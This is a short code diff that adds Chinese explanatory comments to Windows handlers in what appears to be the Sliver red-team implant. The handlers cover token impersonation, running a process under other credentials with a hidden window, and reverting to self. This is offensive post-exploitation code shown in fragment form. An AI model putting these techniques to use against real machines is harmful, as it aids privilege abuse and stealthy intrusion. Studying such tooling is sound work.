@@ -149,6 +149,8 @@ func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
 
 // ---------------- Windows Handlers ----------------
 
+// 模拟Token，提供username，自己遍历进行模拟
+// 在模拟成功后会设置全局变量，Windows功能执行的时候，所判断的Token，就是这里设置的
 func impersonateHandler(data []byte, resp RPCResponse) {
 	impersonateReq := &sliverpb.ImpersonateReq{}
 	err := proto.Unmarshal(data, impersonateReq)
@@ -170,6 +172,7 @@ func impersonateHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+// CreateProcessWithLogonW创建进程，可提供账号密码等信息，允许仅当网络请求时使用指定权限
 func runAsHandler(data []byte, resp RPCResponse) {
 	runAsReq := &sliverpb.RunAsReq{}
 	err := proto.Unmarshal(data, runAsReq)
@@ -180,6 +183,7 @@ func runAsHandler(data []byte, resp RPCResponse) {
 		return
 	}
 	show := 10
+	// 是否隐藏窗口
 	if runAsReq.HideWindow {
 		show = 0
 	}
@@ -192,10 +196,12 @@ func runAsHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
+// 恢复Token
 func revToSelfHandler(_ []byte, resp RPCResponse) {
 	//{{if .Config.Debug}}
 	log.Println("Calling revToSelf...")
 	//{{end}}
+	// 抹除当前的全局变量的Token值，并不是Windows功能执行时所使用的那个
 	taskrunner.CurrentToken = windows.Token(0)
 	err := priv.RevertToSelf()
 	revToSelf := &sliverpb.RevToSelf{}
